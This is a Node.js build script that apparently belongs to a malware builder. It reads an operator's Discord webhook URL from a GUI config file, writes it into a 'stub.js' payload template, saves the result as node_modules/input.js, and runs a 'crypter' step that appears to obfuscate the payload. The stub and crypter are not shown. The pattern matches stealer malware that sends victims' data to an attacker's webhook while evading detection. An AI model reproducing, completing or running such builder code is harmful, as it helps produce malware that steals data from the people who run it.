const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { executeSecondCrypterScript } = require('./crypto-utils');

const PLACEHOLDERS = {
  DISCORD: 'REMPLACE_ME'
};

async function main() {
  try {
    const configPath = path.resolve(__dirname, '../gui/info.json');
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    const stubPath = path.resolve(__dirname, 'stub.js');
    const originalStub = fs.readFileSync(stubPath, 'utf8');
    
    const modifiedStub = originalStub.replace(
      new RegExp(PLACEHOLDERS.DISCORD, 'g'), 
      config.discordWebhookURL
    );

    const targetDir = path.join(__dirname, 'node_modules');
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir);
    fs.writeFileSync(path.join(targetDir, 'input.js'), modifiedStub);
    await executeSecondCrypterScript();
  } catch (error) {
    console.error(`Process Faild: ${error.message}`);
    process.exit(1);
  }
}

main();
